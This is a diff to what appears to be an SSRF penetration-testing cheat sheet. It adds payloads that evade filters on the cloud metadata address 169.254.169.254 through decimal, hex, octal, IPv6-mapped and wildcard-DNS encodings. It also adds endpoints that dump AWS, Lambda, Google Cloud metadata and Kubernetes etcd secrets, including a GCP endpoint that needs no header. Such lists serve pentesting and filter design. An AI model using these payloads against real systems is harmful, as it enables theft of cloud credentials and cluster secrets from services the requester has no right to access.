@@ -327,7 +327,18 @@ http://0NaN
 http://0NaN.0NaN
 ```
 
-## Vulnerabilities
+### Metadata IP Bypasses (169.254.169.254)
+
+When a filter blocks the literal `169.254.169.254` but reassembles the host before connecting, encode the same address so it slips the string match yet still resolves to the IMDS link-local IP:
+
+```
+http://2852039166                  (dotless decimal of 169.254.169.254)
+http://0x41414141A9FEA9FE          (hex with leading overflow padding — low 32 bits = A9FEA9FE = 169.254.169.254)
+http://0251.254.169.254            (mixed octal + decimal; 0251 == 169)
+http://[::ffff:a9fe:a9fe]          (IPv6-mapped IPv4 of 169.254.169.254)
+http://169.254.169.254.nip.io/     (wildcard DNS that resolves the embedded IP)
+http://instance-data              (AWS-internal hostname that resolves to the IMDS IP)
+```
 
 ### Common SSRF Vulnerabilities
 
@@ -369,11 +380,16 @@ X-aws-ec2-metadata-token: <TOKEN_FROM_STEP1>
 4. SSRF through applications that intentionally support PUT (webhooks, API gateways)
 5. Vulnerable proxy servers that forward method override headers (`X-HTTP-Method-Override: PUT`)
 
+- **AWS IMDS over IPv6**: `http://[fd00:ec2::254]/latest/meta-data/` (the IMDS IPv6 endpoint; works when the IPv4 `169.254.169.254` is the only address filtered)
+- **AWS Lambda Runtime API**: `http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next` (inside Lambda, this env-var host serves the next invocation event — often carrying caller-supplied data and context)
 - **Azure**: `http://169.254.169.254/metadata/instance` (requires header `Metadata: true` and `api-version`; alternate IP `http://168.63.129.16/metadata/instance`)
 - **DigitalOcean**: `http://169.254.169.254/metadata/v1.json`
 - **Equinix Metal**: `http://169.254.169.254/metadata` (legacy `metadata.packet.net` now redirects here)
 - **Google Cloud**: `http://metadata.google.internal/computeMetadata/v1/`
+  - One-shot recursive dump (still needs `Metadata-Flavor: Google`): `http://metadata.google.internal/computeMetadata/v1/?recursive=true`
+  - Header-less legacy endpoint (no `Metadata-Flavor` header required — usable from header-restricted SSRF): `http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true`
 - **Oracle Cloud**: `http://169.254.169.254/opc/v1/instance/`
+- **Kubernetes etcd (v2 API)**: `http://127.0.0.1:2379/v2/keys/?recursive=true` (when etcd is reachable from the SSRF vantage point, recursively dumps every key — including Secrets — in one request)
 
 #### Internal Service Exposure
 
